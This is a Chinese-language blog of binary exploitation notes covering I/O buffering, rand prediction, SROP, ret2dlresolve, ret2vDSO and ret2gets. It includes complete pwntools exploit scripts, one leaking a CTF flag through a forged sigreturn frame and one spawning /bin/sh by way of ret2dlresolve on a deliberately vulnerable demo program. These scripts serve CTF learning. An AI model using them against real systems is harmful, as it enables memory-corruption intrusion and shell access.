---
title: "Beyond Basics: The Dark Arts of Binary Exploitation"
published: 2025-02-01
updated: 2025-09-26
description: "An in-depth collection of techniques and mind-bending tricks that every aspiring pwner needs to know."
image: "https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.5trbo219x2.avif"
tags: ["Pwn", "Notes"]
category: "Notes"
draft: false
---

# 前言

> 自 23 年刚推开 Pwn 之门的一条窄缝以来，一直有着这样一个想法：「写一份有关 Pwn 的详细教程，又或许是经验梳理与总结，让有志之士从入门到入坟，少走弯路，不那么痛苦。」~_伟大吗？_~
>
> 本来想用 GitBook 或者建一个类似 wiki 的平台来写这个的，不过最终还是决定放在这里，为啥？我不知道……
>
> 不过我可能不会经常更新这篇 blog，而是 _Keep updating as the mood strikes._ 但是请放心，不论你现在看到的这篇文章有多简陋……给我点时间，未来它一定会成为一本不错的参考手册！
>
> 莫欺少年穷，咱顶峰相见。
>
> <p style="text-align: right;">——以上，书于 02/01/2025</p>
> <p style="text-align: right;">更新于 09/10/2025</p>

# Flush or Be Flushed: C I/O 缓冲区的秘密生活

`stdout` 有三种缓冲模式：

- **行缓冲 (line-buffered)** 只有在输出 `\n` 时才 flush（前提是目标是终端 tty）
- **全缓冲 (fully-buffered)** 只有缓冲区填满或程序结束才 flush
- **无缓冲 (unbuffered)** 每次写都会 flush

默认规则是：

- 如果 **stdout** 指向**终端 (tty)**，则为行缓冲
- 如果 **stdout** 被重定向到 **pipe / socket / file** 则为全缓冲

# 上帝掷骰子？不，其实是线性同余

[rand](https://en.cppreference.com/w/c/numeric/random/rand) 生成的是伪随机数，范围是 $[ 0,RAND\_MAX]$，只要 seed 相同就可以「预测」：

```python
import ctypes

libc = ctypes.CDLL("./libc.so.6")

# libc.srand(1)
predicted = libc.rand()
```

:::tip
没有使用 `srand` 设置 seed 的，默认为 `srand(1)`。
:::

# 一环套一环：ROP 链与栈上的奇技淫巧

## ret2csu

我在 [ROP Emporium - Challenge 8](/posts/write-ups/rop-emporium-series/#challenge-8) 写的已经很详细了，最近比赛赶时间，等我打完之后再来慢慢完善吧，只能暂且劳请各位老爷们先凑合着看了<s>_（如果有人看的话。/真叫人伤心）_</s>。

## SROP

### Principle

Okay, the first thing, what is `SROP`?

`SROP (Signal Return Oriented Programming)`，思想是利用操作系统信号处理机制的漏洞来实现对程序控制流的劫持。

首先得知道，信号是操作系统发送给程序的中断信息，通常用于指示发生了一些必须立即处理的异常情况。

而 `sigreturn` 则是一个特殊的 `syscall`，负责在信号处理函数执行完后根据栈上保存的 `sigcontext` 的内容进行清理工作（还原到程序在进行信号处理之前的运行状态，就好像什么都没有发生一样，以便于接着运行因中断而暂停的程序）。它帮助程序**从 Signal Handler（泛指信号处理函数）中返回**，并通过清理信号处理函数使用的栈帧来恢复程序的运行状态。

我们知道，在传统的 ROP 中，攻击者可以利用程序中已存在的 gadgets 构造一个指令序列来执行恶意代码。SROP 则在此基础上利用了信号处理机制的漏洞，在信号处理函数的上下文切换中执行攻击，实现一次控制所有寄存器的效果。

攻击步骤大致如下：

- 攻击者通过在栈上伪造 `sigcontext` 结构来为控制寄存器的值做准备。一般会在这一步设置好后续 ROP Chain 中恶意代码要用到的参数，需要注意的是没有设置的寄存器在执行 `sigreturn` 后会被 zero out.
- 想办法令目标程序执行 `sigreturn`，进行信号处理。
- 调用 `sigreturn` 后，系统会暂停当前程序的执行，通过 Signal Handler 处理信号，处理完后根据 `sigcontext` 的内容恢复运行环境。
- 这时候我们已经达成了设置参数的目的，可以选择返回到 ROP Chain 继续执行恶意代码。

正常情况下当遇到需要处理信号的时候，`kernel` 会在栈上创建一个新的栈帧，并生成一个 `sigcontext` 结构保存在新的栈帧中，`sigcontext` 本质上就是一个对执行信号处理函数前的运行环境的快照，以便之后恢复到执行信号处理函数之前的环境接着运行；接着切换上下文到 Signal Handler 中进行信号处理工作；当信号不再被阻塞时，`sigreturn` 会根据栈中保存的 `sigcontext` 弹出所有寄存器的值，有效地将寄存器还原为执行信号处理之前的状态。

那对于我们主动诱导程序去执行 `sigreturn` 的这种非正常情况，栈上肯定是不会有 `kernel` 生成的 `sigcontext` 结构的，我就问你你能不能在栈上伪造一个 `sigcontext` 出来？嘿嘿。

敏锐的你现在是不是想跳起来惊呼，这是不是好比核武器？没错，通过伪造 `sigcontext` 你可以一次控制所有寄存器的值，SO FUCKING POWERFUL!

不幸的是这也是它的缺点所在……如果你不能泄漏栈值，就无法为 RSP 等寄存器设置一个有效的值，这或许是个棘手的问题。但无论如何，这都是一个强大的 trick, 尤其是在可用的 gadgets 有限的情况下。

用于恢复状态的 `sigcontext` 的结构如下 (基于 `x86_64`)：

```plaintext wrap=false showLineNumbers=false
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```

有关 SROP 的演示，这里还有一个视频讲的也很好，强推给你！

<iframe
  width="100%"
  height="468"
  src="https://www.youtube.com/embed/ADULSwnQs-s?si=j1WVxYk2FPR21uZQ"
  title="YouTube video player"
  frameborder="0"
  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
  allowfullscreen>
</iframe>

### Example

好了，知道了这些基础概念后，下面就通过 Backdoor CTF 2017 的 [Fun Signals](https://github.com/guyinatuxedo/nightmare/blob/master/modules/16-srop/backdoor_funsignals/funsignals_player_bin) 这道题来实战一下吧～

```asm wrap=false showLineNumbers=false ins={35}
.shellcode:0000000010000000                     .686p
.shellcode:0000000010000000                     .mmx
.shellcode:0000000010000000                     .model flat
.shellcode:0000000010000000     .intel_syntax noprefix
.shellcode:0000000010000000
.shellcode:0000000010000000     ; ===========================================================================
.shellcode:0000000010000000
.shellcode:0000000010000000     ; Segment type: Pure code
.shellcode:0000000010000000     ; Segment permissions: Read/Write/Execute
.shellcode:0000000010000000     _shellcode      segment byte public 'CODE' use64
.shellcode:0000000010000000                     assume cs:_shellcode
.shellcode:0000000010000000                     ;org 10000000h
.shellcode:0000000010000000                     assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
.shellcode:0000000010000000
.shellcode:0000000010000000                     public _start
.shellcode:0000000010000000     _start:                                 ; Alternative name is '_start'
.shellcode:0000000010000000                     xor     eax, eax        ; __start
.shellcode:0000000010000002                     xor     edi, edi        ; Logical Exclusive OR
.shellcode:0000000010000004                     xor     edx, edx        ; Logical Exclusive OR
.shellcode:0000000010000006                     mov     dh, 4
.shellcode:0000000010000008                     mov     rsi, rsp
.shellcode:000000001000000B                     syscall                 ; LINUX - sys_read
.shellcode:000000001000000D                     xor     edi, edi        ; Logical Exclusive OR
.shellcode:000000001000000F                     push    0Fh
.shellcode:0000000010000011                     pop     rax
.shellcode:0000000010000012                     syscall                 ; LINUX - sys_rt_sigreturn
.shellcode:0000000010000014                     int     3               ; Trap to Debugger
.shellcode:0000000010000015
.shellcode:0000000010000015     syscall:                                ; LINUX - sys_rt_sigreturn
.shellcode:0000000010000015                     syscall
.shellcode:0000000010000017                     xor     rdi, rdi        ; Logical Exclusive OR
.shellcode:000000001000001A                     mov     rax, 3Ch ; '<'
.shellcode:0000000010000021                     syscall                 ; LINUX - sys_exit
.shellcode:0000000010000021     ; ---------------------------------------------------------------------------
.shellcode:0000000010000023     flag            db 'fake_flag_here_as_original_is_at_server',0
.shellcode:0000000010000023     _shellcode      ends
.shellcode:0000000010000023
```

可以看到这是一个非常简单的程序，单纯的就是为了考 SROP，以至于出题人都直接手撸汇编了。

注意到 flag 被硬编码在 `0x10000023` 这个位置了，所以我们的目标就是输出这个地址处的内容。由于这个程序没开 ASLR 什么的保护，拿下它还是非常轻松的。

简单分析一下这个程序，我们知道它在第一个 `syscall` 处调用了 `read`，从 `stdin` 读取了 `0x400` bytes 到栈上。紧接着第二个 `syscall` 直接帮我们调用了 `rt_sigreturn`，那就不用我们自己动手了，我们只要伪造并发送 `sigcontext` 栈帧即可。思路是伪造一个 `SYS_write` 的调用，将 flag 输出到 `stdout`。

### Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import (
    ELF,
    ROP,
    SigreturnFrame,
    constants,
    context,
    gdb,
    log,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./funsignals_player_bin"
HOST, PORT = "localhost", 1337

gdbscript = """
b *_start+11
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload():
    flag_address = 0x10000023

    rop = ROP(elf)

    syscall = rop.syscall.address

    frame = SigreturnFrame()

    frame.rdi = 0x1
    frame.rsi = flag_address
    frame.rdx = 0x1337
    frame.rax = constants.SYS_write
    frame.rip = syscall

    return bytes(frame)


def attack(target):
    try:
        payload = construct_payload()

        target.send(payload)

        response = target.recvall(timeout=3)

        if b"flag" in response:
            log.success(response[:0x27].decode("ascii"))

            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Summary

总结：有的时候你的 ROP Chain 可能会缺少一些必要的 gadgets，导致无法设定某些后续攻击代码需要用到的参数，这时候就可以考虑使用 SROP 来控制寄存器。当然，使用 SROP 也是有条件的，比如你起码得有 `syscall` 这个 gadget，并且能控制 `rax` 的值为 `sigreturn` 的系统调用号。

> [!TIP]
> 要知道 `rax` 是一个特殊的寄存器，通常用于保存函数的返回值。所以当我说控制 `rax` 的值时，你不一定非得通过某些 gadgets 来实现这一点，有时候程序本身就可以为你设置好它，比如 `read` 函数会返回读到的字节数。

### References

- [Boosting your ROP skills with SROP and ret2dlresolve - Giulia Martino - HackTricks Track 2023](https://youtu.be/ADULSwnQs-s?si=TC5OyUwFHDFEHRO3)
- [sigreturn(2) — Linux manual page](https://man7.org/linux/man-pages/man2/sigreturn.2.html)
- [Playing with signals: an overview on Sigreturn Oriented Programming](https://www.stormshield.com/news/playing-with-signals-an-overview-on-sigreturn-oriented-programming/)

## ret2dlresolve

### Principle

对于 `dynamically linked` 的程序，当它第一次调用共享库中的函数时，动态链接器（如 `ld-linux-x86-64.so.2`）会通过 `_dl_runtime_resolve` 函数动态解析共享库中符号的地址，并将解析出来的实际地址保存到 `GOT (Global Offset Table)` 中，这样下次调用这个函数就不需要再次解析，可以直接通过全局偏移表进行跳转。

以上流程我们称之为重定位 (Relocation)。

> 具体重定位流程以及为什么需要重定位，不同 `RELRO` 保护级别之间的区别之类的，我之后再单独开一个小标题来写，这里先占个坑。

`_dl_runtime_resolve` 函数从栈中获取对一些它需要的结构的引用，以便解析指定的符号。因此攻击者通过伪造这个结构就可以劫持 `_dl_runtime_resolve` 让它去解析任意符号地址。

### Example

我们就以 `pwntools` 官方文档里面提供的示例程序来学习 how to ret2dlresolve. 其实就是学一下如何使用它提供的自动化工具……有关如何手动伪造 `_dl_runtime_resolve` 所需的结构体，以及一些更深入的话题，我之后应该还会回来填这个坑，先立 flag 了哈哈哈。

示例程序来源于 [pwnlib.rop.ret2dlresolve — Return to dl_resolve](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html)，通过下面这条指令来编译：

```bash wrap=false showLineNumbers=false
gcc ret2dlresolve.c -o ret2dlresolve \
    -fno-stack-protector \
    -no-pie
```

`pwntools` 官方文档里给我们的程序源码是这样的：

```c
#include <unistd.h>

void vuln(void) {
  char buf[64];

  read(STDIN_FILENO, buf, 200);
}

int main(int argc, char **argv) { vuln(); }
```

但是编译出来后发现真 TM 坑，没有控制前三个参数的 gadgets，导致我们不能写入伪造的结构体……所以为了实验的顺利进行，我只得手动插入几个 gadgets 了：

```c
#include <unistd.h>

void free_gadgets() {
  __asm__("pop %rdi; ret");
  __asm__("pop %rsi; ret");
  __asm__("pop %rdx; ret");
}

void vuln(void) {
  char buf[64];

  read(STDIN_FILENO, buf, 200);
}

int main(int argc, char **argv) { vuln(); }
```

程序很简单，从 `stdin` 读取了 200 字节数据到 `buf`，由于 `buf` 只有可怜的 64 字节空间，故存在 136 字节溢出空间。空间如此之充裕，让我们有足够的余地来编排一曲邪恶的代码交响乐，演绎攻击者的狂想曲。

我们的目标是通过 `ret2dlresolve` 技术来 getshell. 思路大致应该是：将伪造的用于解析 `system` 符号的结构体放到一个 `rw` 空间，并提前设置好 `system` 函数要用到的参数，也就是将 `rdi` 设为 `/bin/sh` 字符串的地址。接着在栈上布置我们伪造的结构的地址，以便 `_dl_runtime_resolve` 引用我们伪造的这个结构体来解析符号。现在我们调用 `_dl_runtime_resolve` 就会解析出 `system` 的地址，根据我们先前设置好的参数，程序会乖乖的 spawn a shell.

### Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import (
    ELF,
    ROP,
    Ret2dlresolvePayload,
    context,
    flat,
    gdb,
    log,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./ret2dlresolve"
HOST, PORT = "localhost", 1337

gdbscript = """
b *vuln+25
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(padding_to_ret, first_read_size):
    dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
    fake_structure = dlresolve.payload

    rop = ROP(elf)

    rop.read(0, dlresolve.data_addr, len(fake_structure))
    rop.raw(rop.ret.address)
    rop.ret2dlresolve(dlresolve)

    log.success(rop.dump())

    raw_rop = rop.chain()

    return flat({padding_to_ret: raw_rop, first_read_size: fake_structure})


def attack(target):
    try:
        payload = construct_payload(0x48, 0xC8)

        target.sendline(payload)
        target.interactive()
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            attack(target)
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Summary

当没有可用的 `syscall` gadgets 来实现 `ret2syscall` 或 `SROP`，并且没有办法泄漏 `libc` 地址时，可以考虑 `ret2dlresolve`。

### References

- [Boosting your ROP skills with SROP and ret2dlresolve - Giulia Martino - HackTricks Track 2023](https://youtu.be/ADULSwnQs-s?si=TC5OyUwFHDFEHRO3)
- [ret2dl_resolve x64: Exploiting Dynamic Linking Procedure In x64 ELF Binaries](https://syst3mfailure.io/ret2dl_resolve/)
- [Finding link_map and \_dl_runtime_resolve() under full RELRO](https://ypl.coffee/dl-resolve-full-relro/)

## ret2vDSO

### Principle

`vDSO (Virtual Dynamic Shared Object)` 是 Linux 内核为用户态程序提供的一个特殊共享库，注意它是虚拟的，本身并不存在，它做的只是将一些常用的内核态调用映射到用户地址空间。这么做的目的是为了加速系统调用，避免频繁地从用户态切换到内核态，有效的减少了切换带来的巨大开销。

在 vDSO 区域 可能存在一些 gadgets，用于从用户态切换到内核态。我们关注的就是这块区域里有没有什么可供我们利用的 gadgets，通常需要手动把 vDSO dump 出来分析。

### Example

崩溃了兄弟，我自己出了一道题然后折腾了两天做不出来……我好菜啊……受到致命心理打击。例题等我缓过来再说吧，估计一年都不想碰这个了……反正只要知道 vDSO 区域里面存在一些可用的 gadgets 就好了，剩下的和普通 ROP 没啥区别。

示范一下怎么通过 gdb dump 出 vDSO：

```asm wrap=false showLineNumbers=false
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /home/cub3y0nd/Projects/ret2vDSO/ret2vDSO
    0x555555555000     0x555555556000 r-xp     1000   1000 /home/cub3y0nd/Projects/ret2vDSO/ret2vDSO
    0x555555556000     0x555555557000 r--p     1000   2000 /home/cub3y0nd/Projects/ret2vDSO/ret2vDSO
    0x7ffff7fbf000     0x7ffff7fc1000 rw-p     2000      0 [anon_7ffff7fbf]
    0x7ffff7fc1000     0x7ffff7fc5000 r--p     4000      0 [vvar]
    0x7ffff7fc5000     0x7ffff7fc7000 r-xp     2000      0 [vdso]
    0x7ffff7fc7000     0x7ffff7fc8000 r--p     1000      0 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7fc8000     0x7ffff7ff1000 r-xp    29000   1000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  2a000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7fff000 rw-p     4000  34000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
pwndbg> dump memory vdso.so 0x7ffff7fc5000 0x7ffff7fc7000
```

用 `ROPgadget` 分析 dump 出来的文件，大概那么一看有将近 500 个 gadgets，不过好像并不是很实用呢？感觉用这个 trick 性价比不高，不过也是一个值得尝试的方法。

嗯……再来介绍个好东西，叫 `ELF Auxiliary Vectors (AUXV)`，ELF 辅助向量。它是内核在加载 ELF 可执行文件时传递给用户态程序的一组键值对。包含了与程序运行环境相关的底层信息，例如系统调用接口位置、内存布局、硬件能力等。

当一个程序被加载时，Linux 内核将参数数量 (argc)、参数 (argv)、环境变量 (envp) 以及 AUXV 结构传递给程序的入口函数。程序可以通过系统提供的 `getauxval` 访问这些辅助向量，以获取系统信息。

看看当前最新的 `v6.14-rc1` 内核中有关它的定义（旧版本中有关它的定义在 `elf.h` 中）：

```c
/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
#ifndef _UAPI_LINUX_AUXVEC_H
#define _UAPI_LINUX_AUXVEC_H

#include <asm/auxvec.h>

/* Symbolic values for the entries in the auxiliary table
   put on the initial stack */
#define AT_NULL   0 /* end of vector */
#define AT_IGNORE 1 /* entry should be ignored */
#define AT_EXECFD 2 /* file descriptor of program */
#define AT_PHDR   3 /* program headers for program */
#define AT_PHENT  4 /* size of program header entry */
#define AT_PHNUM  5 /* number of program headers */
#define AT_PAGESZ 6 /* system page size */
#define AT_BASE   7 /* base address of interpreter */
#define AT_FLAGS  8 /* flags */
#define AT_ENTRY  9 /* entry point of program */
#define AT_NOTELF 10 /* program is not ELF */
#define AT_UID    11 /* real uid */
#define AT_EUID   12 /* effective uid */
#define AT_GID    13 /* real gid */
#define AT_EGID   14 /* effective gid */
#define AT_PLATFORM 15  /* string identifying CPU for optimizations */
#define AT_HWCAP  16    /* arch dependent hints at CPU capabilities */
#define AT_CLKTCK 17 /* frequency at which times() increments */
/* AT_* values 18 through 22 are reserved */
#define AT_SECURE 23   /* secure mode boolean */
#define AT_BASE_PLATFORM 24 /* string identifying real platform, may
     * differ from AT_PLATFORM. */
#define AT_RANDOM 25 /* address of 16 random bytes */
#define AT_HWCAP2 26 /* extension of AT_HWCAP */
#define AT_RSEQ_FEATURE_SIZE 27 /* rseq supported feature size */
#define AT_RSEQ_ALIGN  28 /* rseq allocation alignment */
#define AT_HWCAP3 29 /* extension of AT_HWCAP */
#define AT_HWCAP4 30 /* extension of AT_HWCAP */

#define AT_EXECFN  31 /* filename of program */

#ifndef AT_MINSIGSTKSZ
#define AT_MINSIGSTKSZ 51 /* minimal stack size for signal delivery */
#endif

#endif /* _UAPI_LINUX_AUXVEC_H */
```

对于特定的架构可能还有一些特别的宏定义：

```c
/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
#ifndef _ASM_X86_AUXVEC_H
#define _ASM_X86_AUXVEC_H
/*
 * Architecture-neutral AT_ values in 0-17, leave some room
 * for more of them, start the x86-specific ones at 32.
 */
#ifdef __i386__
#define AT_SYSINFO 32
#endif
#define AT_SYSINFO_EHDR 33

/* entries in ARCH_DLINFO: */
#if defined(CONFIG_IA32_EMULATION) || !defined(CONFIG_X86_64)
# define AT_VECTOR_SIZE_ARCH 3
#else /* else it's non-compat x86-64 */
# define AT_VECTOR_SIZE_ARCH 2
#endif

#endif /* _ASM_X86_AUXVEC_H */
```

以上所有内容的参考链接我都放在末尾的 References 了，感兴趣的自行查阅。

我们可以通过指定 `LD_SHOW_AUXV=1` 来查看程序的 AUXV 信息：

```bash wrap=false showLineNumbers=false
λ ~/ LD_SHOW_AUXV=1 w
AT_SYSINFO_EHDR:      0x7f92c06b9000
AT_MINSIGSTKSZ:       1776
AT_HWCAP:             178bfbff
AT_PAGESZ:            4096
AT_CLKTCK:            100
AT_PHDR:              0x626d19090040
AT_PHENT:             56
AT_PHNUM:             13
AT_BASE:              0x7f92c06bb000
AT_FLAGS:             0x0
AT_ENTRY:             0x626d19092940
AT_UID:               1000
AT_EUID:              1000
AT_GID:               1000
AT_EGID:              1000
AT_SECURE:            0
AT_RANDOM:            0x7ffca3edf4e9
AT_HWCAP2:            0x2
AT_EXECFN:            /usr/bin/w
AT_PLATFORM:          x86_64
AT_RSEQ_FEATURE_SIZE: 28
AT_RSEQ_ALIGN:        32
 14:19:59 up  3:54,  1 user,  load average: 0.52, 0.57, 0.59
USER     TTY       LOGIN@   IDLE   JCPU   PCPU  WHAT
cub3y0nd tty1      10:26    3:53m  6:43    ?    xinit /home/cub3y0nd/.xinitrc -- /etc/X11/xinit/xs
```

注意到这个变量是以 `LD_` 开头的，说明动态链接器会负责解析这个变量，因此，如果程序是静态链接的，那使用这个变量将不会得到任何输出。

但是得不到输出不代表它没有，用 `pwndbg` 的 `i auxv` 或 `auxv` 也可以查看程序的 AUXV 信息（或者你手动 telescope stack）：

```asm wrap=false showLineNumbers=false
pwndbg> i auxv
33   AT_SYSINFO_EHDR      System-supplied DSO's ELF header 0x7ffff7ffd000
51   AT_MINSIGSTKSZ       Minimum stack size for signal delivery 0x6f0
16   AT_HWCAP             Machine-dependent CPU capability hints 0x178bfbff
6    AT_PAGESZ            System page size               4096
17   AT_CLKTCK            Frequency of times()           100
3    AT_PHDR              Program headers for program    0x400040
4    AT_PHENT             Size of program header entry   56
5    AT_PHNUM             Number of program headers      6
7    AT_BASE              Base address of interpreter    0x0
8    AT_FLAGS             Flags                          0x0
9    AT_ENTRY             Entry point of program         0x40101d
11   AT_UID               Real user ID                   1000
12   AT_EUID              Effective user ID              1000
13   AT_GID               Real group ID                  1000
14   AT_EGID              Effective group ID             1000
23   AT_SECURE            Boolean, was exec setuid-like? 0
25   AT_RANDOM            Address of 16 random bytes     0x7fffffffe789
26   AT_HWCAP2            Extension of AT_HWCAP          0x2
31   AT_EXECFN            File name of executable        0x7fffffffefce "/home/cub3y0nd/Projects/ret2vDSO/ret2vDSO"
15   AT_PLATFORM          String identifying platform    0x7fffffffe799 "x86_64"
27   AT_RSEQ_FEATURE_SIZE rseq supported feature size    28
28   AT_RSEQ_ALIGN        rseq allocation alignment      32
0    AT_NULL              End of vector                  0x0
```

这之中我们最关心的应该是 `AT_SYSINFO_EHDR`，它与 `vDSO` 的起始地址相同。因此，只要能把它泄漏出来，我们就可以掌握 vDSO 的 gadgets 了。

其中 `AT_RANDOM` 好像也是一个很实用的东西，等我有空了再好好研究研究这些，话说这是我立的第几个 flag 了……

一般程序的返回地址之后紧接着的就是 `argc`，然后是 `argv`，再之后就是 `envp`，最后还有一堆信息，它们就是 `AUXV` 了，这些都在栈上保存，自己研究去吧，我心好累……

### Summary

反正我感觉这是一个性价比不怎么高的 trick，不过要是实在没办法搞到可用的 gadgets 的话还是可以考虑一下的。

### References

- [vDSO](https://en.wikipedia.org/wiki/VDSO)
- [getauxval(3) — Linux manual page](https://man7.org/linux/man-pages/man3/getauxval.3.html)
- [kernel/git/torvalds/linux.git - path: root/include/uapi/linux/auxvec.h](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/auxvec.h?h=v6.14-rc1)
- [kernel/git/torvalds/linux.git - path: root/arch/x86/include/uapi/asm/auxvec.h](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/include/uapi/asm/auxvec.h?h=v6.14-rc1)

## Try-Catch, Catch Me If You Can

这是关于 (CHOP) Catch Handler Oriented Programming 的，我单独写了一篇博客，请移步 [CHOP Suey: 端上异常处理的攻击盛宴](/posts/pwn-notes/catch-handler-oriented-programming-notes/)。

# 当 gadgets 缺席：Who needs "pop rdi" when you have gets() ?

`ret2gets` 是用于在没有常用 gadgets，比如没有 `pop rdi` 的情况下，通过调用 `gets`，配合 `printf / puts` 实现 libc 地址泄漏的 trick 。

:::tip
次 trick 适用于 `GLIBC >= 2.34，<= 2.41` 的 ROP Chain 构造。
:::

直接上 demo，这里使用的 GLIBC 版本是 `2.41-6ubuntu1_amd64`：

```c
// gcc -Wall vuln.c -o vuln -no-pie -fno-stack-protector -std=c99

#include <stdio.h>

int main() {
  char buf[0x20];
  puts("ROP me if you can!");
  gets(buf);

  return 0;
}
```

:::important
`gets` 函数在 C11 中被移除，所以我们编译的时候需要手动指定一个低于 C11 的标准，比如这里指定了 C99。
:::

如果我们使用 ropper 或者其它同类工具，列出这个程序中包含的 gadgets，我们会发现它并没有 `pop rdi` 的 gadget，我们什么参数也控制不了。

这是因为原先的这些控制寄存器的 gadgets 都是来自于 `__libc_csu_init`，而现在这个函数因为包含了易于构造 ROP Chain 的 gadgets，在 GLIBC 2.34 中已经被移除了，导致我们现在很难再找到有用的 gadgets 。

这里我们在调用 `gets` 的地方下断点，执行 `gets` 之前 `rdi` 指向的是 buf 的栈地址，`ni`，随便输入什么后，发现 `rdi` 寄存器变成了 `*RDI  0x7ffff7e137c0 (_IO_stdfile_0_lock) ◂— 0`：

<center>
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.1lc6yoffsz.avif" alt="" />
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.13m5a38r8s.avif" alt="" />
</center>

定位一下，发现该结构体位于 libc 的 rw 段中：

```asm showLineNumbers=false
pwndbg> vmmap $rdi
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
    0x7ffff7e11000     0x7ffff7e13000 rw-p     2000 210000 libc.so.6
►   0x7ffff7e13000     0x7ffff7e20000 rw-p     d000      0 [anon_7ffff7e13] +0x7c0
    0x7ffff7fb4000     0x7ffff7fb9000 rw-p     5000      0 [anon_7ffff7fb4]
pwndbg> x/10gx $rdi
0x7ffff7e137c0 <_IO_stdfile_0_lock>: 0x0000000000000000 0x0000000000000000
0x7ffff7e137d0 <__pthread_force_elision>: 0x0000000000000000 0x0000000000000000
0x7ffff7e137e0 <__attr_list_lock>: 0x0000000000000000 0x0000000000000000
0x7ffff7e137f0 <init_sigcancel>: 0x0000000000000000 0x0000000000000000
0x7ffff7e13800 <__nptl_threads_events>: 0x0000000000000000 0x0000000000000000
```

那么如果我们再次调用 gets，我们就可以覆盖 libc 中的数据，这可能会导致一些漏洞。

这里我们先研究我们已经获得的 `_IO_stdfile_0_lock`：

## \_IO_stdfile_0_lock

首先简单介绍一下 `_IO_stdfile_0_lock` 是什么，从名字上看，我们就能猜到它是一把「锁」，肯定是用于多线程安全的，实际上也确实如此，它主要用于锁住 `FILE`。

由于 glibc 支持多线程，许多函数实现需要线程安全。如果存在多个线程可以同时使用同一个 FILE 结构，那么当有两个线程尝试同时使用一个 FILE 结构时，就会产生条件竞争，可能会破坏 FILE 结构。解决方案就是加锁。

:::tip
基于 [glibc-2.41](https://elixir.bootlin.com/glibc/glibc-2.41/source/libio/iogets.c) 的源码。
:::

```c
char *
_IO_gets (char *buf)
{
  size_t count;
  int ch;
  char *retval;

  _IO_acquire_lock (stdin);
  ch = _IO_getc_unlocked (stdin);
  if (ch == EOF)
    {
      retval = NULL;
      goto unlock_return;
    }
  if (ch == '\n')
    count = 0;
  else
    {
      /* This is very tricky since a file descriptor may be in the
  non-blocking mode. The error flag doesn't mean much in this
  case. We return an error only when there is a new error. */
      int old_error = stdin->_flags & _IO_ERR_SEEN;
      stdin->_flags &= ~_IO_ERR_SEEN;
      buf[0] = (char) ch;
      count = _IO_getline (stdin, buf + 1, INT_MAX, '\n', 0) + 1;
      if (stdin->_flags & _IO_ERR_SEEN)
 {
   retval = NULL;
   goto unlock_return;
 }
      else
 stdin->_flags |= old_error;
    }
  buf[count] = 0;
  retval = buf;
unlock_return:
  _IO_release_lock (stdin);
  return retval;
}

weak_alias (_IO_gets, gets)

link_warning (gets, "the `gets' function is dangerous and should not be used.")
```

